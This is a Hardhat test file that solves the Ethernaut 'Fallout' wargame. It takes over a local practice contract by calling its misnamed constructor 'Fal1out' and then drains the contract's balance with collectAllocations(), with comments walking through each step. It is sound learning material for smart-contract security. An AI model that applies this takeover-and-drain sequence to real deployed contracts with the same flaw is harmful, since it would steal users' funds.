import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { expect } from "chai"
import { ethers, network, deployments } from "hardhat"
import { developmentChains } from "../../helper-hardhat-config"
import { Fallout } from "../../typechain-types"

!developmentChains.includes(network.name)
    ? describe.skip
    : describe("Fallout Exploit Testing", () => {
          let fallOut: Fallout
          let deployer: SignerWithAddress, exploiter: SignerWithAddress
          before(async () => {
              await deployments.fixture(["fallout"])

              fallOut = await ethers.getContract("Fallout")
              const accounts = await ethers.getSigners()
              deployer = accounts[0]
              exploiter = accounts[1]
          })

          it("Fallout exploit testing", async () => {
              // First thing to note is that `Fallout` constructor is named as `Fal1out`
              // this is a public function allowing anyone to change the owner of contract

              // note that even though it looks like owner is set as constructor
              // owner is not really set -> we can check this

              expect(await fallOut.owner()).equals(
                  ethers.constants.AddressZero,
                  "initial owner = address(0)"
              )

              // first step is to call this function with 0.00001 eth
              const falloutTx = await fallOut
                  .connect(exploiter)
                  .Fal1out({ value: ethers.utils.parseEther("0.0001") })

              //check if owner of contract is changed
              expect(await fallOut.owner()).equals(
                  exploiter.address,
                  "on calling Fal1out, owner == exploiter"
              )

              // drain all funds from contract
              const drainFalloutTx = await fallOut.connect(exploiter).collectAllocations()

              expect(await ethers.provider.getBalance(fallOut.address)).equals(
                  0,
                  "fallout balance after exploit = 0"
              )
          })
      })
